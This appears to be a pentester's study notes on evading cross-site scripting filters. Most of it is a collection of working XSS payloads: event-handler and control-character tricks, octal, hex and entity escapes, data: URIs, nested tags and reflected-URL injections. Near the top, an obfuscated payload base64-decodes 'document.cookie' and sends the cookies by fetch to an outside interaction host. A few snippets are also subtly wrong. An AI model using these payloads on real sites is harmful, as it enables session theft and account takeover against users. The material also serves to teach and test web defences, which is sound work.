# filter evasion

[XSS Filter Evasion - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

[HTML5 Security Cheatsheet](https://html5sec.org/)

# exfiltrate 

`x%22,%22results%22:[]};fetch(%27https://%27%2batob(%27Zm01N3BmMXNkbmcxMnZmNTU4emdjY3MxZHNqajdndjUub2FzdGlmeS5jb20v%27)%2beval(atob(%27ZG9jdW1lbnQuY29va2ll%27)),{mode:'no-cors'});//`

# Bypassing weak script tag filters

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled.png)

# Using HTML attributes for script exec

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%201.png)

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%202.png)

SWF tool which could be used in rare cases:[https://github.com/evilcos/xss.swf](https://github.com/evilcos/xss.swf)

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%203.png)

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%204.png)

```php
//common filter used for on events
(on\w+\s*=)

//we can easily bypass this thanks to some browser weirdness
<svg/onload=alert(0)>
<svg//////onload=alert(0)>
<svg id=x;onload=alert(0)>
<svg id=`x`onload=alert(0)>
```

```html
<!-- the upgraded filter still  has a weakness because it converts the conrol char to a space. -->
(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)

// so we could still bypass this using control chars
<svg onload%09=alert(0)> //this even works with safari
<svg %09onload=alert(0)>
<svg %09onload%20=alert(0)>
<svg onload%09%20%28%2C%3B=alert(0)>
<svg onload%0B=alert(0)> //this only works in ie
```

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%205.png)

online test to verify: [http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name](http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name)

# Valid Regex filter (2020)

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%206.png)

# Character escaping to bypass keyword filters

```html
<script>\u0061lert(0)</script>
<script>\u0061\u006Cert(0)</script>
```

### Octal Escape

```html
<img src=x onerror="eval('\141lert(0)')">
<img src=x onerror="eval('\141\154\145\162\164\50\60\51')">
```

[https://cyberchef.cybertap.ch/#recipe=To_Octal('Space')Escape_string('Everything','Single',false,false,false/disabled)Find_/_Replace({'option':'Regex','string':' '},'\\',true,false,true,false)&input=YWxlcnQoMCk](https://cyberchef.cybertap.ch/#recipe=To_Octal('Space')Escape_string('Everything','Single',false,false,false/disabled)Find_/_Replace(%7B'option':'Regex','string':'%20'%7D,'%5C%5C',true,false,true,false)&input=YWxlcnQoMCk)

### Hex Escape

```html
<img src=x onerror="eval('\x61lert(0)')">
<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x30\x29')">
```

### Hex Numeric character transfer

```html
<img src=x onerror="eval('&#x0061lert(0)')">
<img src=x onerror="eval('&#97lert(0)')">
```

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%207.png)

# String construction

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%208.png)

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%209.png)

### Pseudo Protocol

In addition to the `javascript:` protocol there is also `data:` as well as `vbscript:` 

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%2010.png)

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==">
```

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%2011.png)

If sanitization is used to remove parts of or entire html tags we can try and bypass this filter with nested or multiple tags.

```html
<scr<script>ipt>alert(0)</script>
<scr<iframe>ipt>alert(0)</script>
```

### Escaping quotes

```html
// lets say there is sanitization that onlz sanitizes quotes but not backslashes we can try and inject code this way:

myinput\' alert(0);//

//tis string will be parsed and after the sanitization it will lok like this:

myinput\\' alert(0);//

//only the backslash is escaped thus allowing us to inject the quote thus allowng us to execue the alert code
```

```jsx
/any string with spaces/.source -> 'any string with spaces'

YW55IHN0cmluZyB3aXRoIHNwYWNlcw.toString(36)

window.atob('YW55IHN0cmluZyB3aXRoIHNwYWNlcw==') -> 'any string with spaces'

String.fromCharCode(61,6c,65,72,74)

decodeURI('alert%280%29') -> 'alert(0)'
decodeURIComponent('alert%280%29') -> 'alert(0)'

//we can also combine methods to take this further:
unescape(/%u0061%u006C%u0065%u0072%u0074%u0028%u0030%u0029/.source) -> 'alert(0)'
eval(unescape(/%u0061%u006C%u0065%u0072%u0074%u0028%u0030%u0029/.source)) -> alert(0)

decodeURI(/alert%280%29/.source) -> 'alert(0)'
decodeURIComponent(/alert%280%29/.source) -> 'alert(0)'
```

![Untitled](filter%20evasion%20896d510035f540a0ae245453b758f3cd/Untitled%2012.png)

## Escaping Parentheses ()

There is a fun way to pass code to a function without using an parentheses and it abuses the window.onerror func.

```jsx
<img src=x onerror="window.onerror=eval;throw'alert\x280\x29'">
// this will overwrite the default onerror function as soon as teh image faisl to load. then we immidiately throw and error with a strin argument. the eval function we assigned to the default error handler will the evaluate our string thus executing the code.

onerror=alert;throw 1;

//this simpler version will pass the error object to the alert function, be aware some browser pass Uncaugth into the arguments.

//of course we can also encode the payload passed via throw
```

# Bypassing Browser Filters

### Injection inside HTML Tag

One of themost common Reflectd XSS vectors which is blocked is:

```jsx
http://victim.site/inject?x=<svg/onload=alert(0)>
```

Just by removing the final `>` we can bypass most browsers:

```jsx
http://victim.site/inject?x=<svg/onload=alert(0)
```

### Injection inside HTML Tag Attributes

```jsx
http://victim.site/inject?x=franco"><svg/onload=alert(0)>
```

This is also blocked by all browsers

On webkit browsers we can bypass this using base64

```jsx
http://victim.site/inject?x=franco"><a/href="data:text/html;base64,YWxlcnQoMCk=">click<!--
```

### Injecting inside script Tags

```jsx
http://victim.site/inject?x=franco";alert(0);//
```

This works in most browsers except IE

### Injecting inside event attributes

event attributes are not inspected by browser filters.

```jsx
http://victim.site/inject?x=franco";alert(0)
```

### DOM Based

DOM based XSS are not inspected by browser filters

WAF evasion owasp filters:

[owasp-modsecurity-crs/modsecurity_crs_41_xss_attacks.conf at master · SpiderLabs/owasp-modsecurity-crs](https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/master/base_rules/modsecurity_crs_41_xss_attacks.conf)